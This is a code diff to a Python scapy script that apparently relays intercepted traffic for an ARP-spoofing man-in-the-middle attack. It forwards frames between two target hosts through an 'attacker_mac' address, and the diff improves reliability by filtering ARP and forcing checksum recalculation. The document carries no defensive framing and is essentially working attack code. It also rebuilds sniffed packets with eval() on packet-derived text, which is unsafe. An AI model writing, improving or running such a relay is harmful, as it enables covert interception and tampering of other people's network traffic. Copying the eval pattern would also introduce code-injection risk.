@@ -3,7 +3,7 @@ import json
 import threading
 import time
 from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP
-from datetime import datetime
+import copy
 
 targets = []
 is_running = True
@@ -24,7 +24,7 @@ def log_error(msg):
 
 
 def send_packet_info(packet):
-    if Ether in packet:
+    if Ether in packet and not ARP in packet:
         src = packet[Ether].src.lower()
         dst = packet[Ether].dst.lower()
         with lock:
@@ -32,7 +32,7 @@ def send_packet_info(packet):
                 mac1 = mac_cache.get(ip1)
                 mac2 = mac_cache.get(ip2)
 
-                found = False 
+                found = False
                 if mac1 is None or mac2 is None:
                     # Skip pairs with missing MACs
                     continue
@@ -42,20 +42,37 @@ def send_packet_info(packet):
                         "type": "packet",
                         "summary": packet.summary(),
                     }
-                    found = True
                     print(json.dumps(info), flush=True)
+                    found = True
 
                 if src == mac1 and dst == attacker_mac:
                     newpacket = eval(packet.command())
                     newpacket[Ether].src = attacker_mac.lower()
                     newpacket[Ether].dst = mac2
-                    sendp(newpacket, iface=conf.iface)
+
+                    if IP in newpacket:
+                        del newpacket[IP].chksum
+                    if TCP in newpacket:
+                        del newpacket[TCP].chksum
+                    if UDP in newpacket:
+                        del newpacket[UDP].chksum
+
+                    sendp(newpacket, iface=conf.iface, verbose=True)
 
                 elif src == mac2 and dst == attacker_mac:
                     newpacket = eval(packet.command())
-                    newpacket[Ether].src = attacker_mac.lower() 
+                    newpacket[Ether].src = attacker_mac.lower()
                     newpacket[Ether].dst = mac1
-                    sendp(newpacket, iface=conf.iface)
+
+                    # Recalculate IP/TCP/UDP checksums if present
+                    if IP in newpacket:
+                        del newpacket[IP].chksum
+                    if TCP in newpacket:
+                        del newpacket[TCP].chksum
+                    if UDP in newpacket:
+                        del newpacket[UDP].chksum
+
+                    sendp(newpacket, iface=conf.iface, verbose=True)
 
                 if found:
                     break
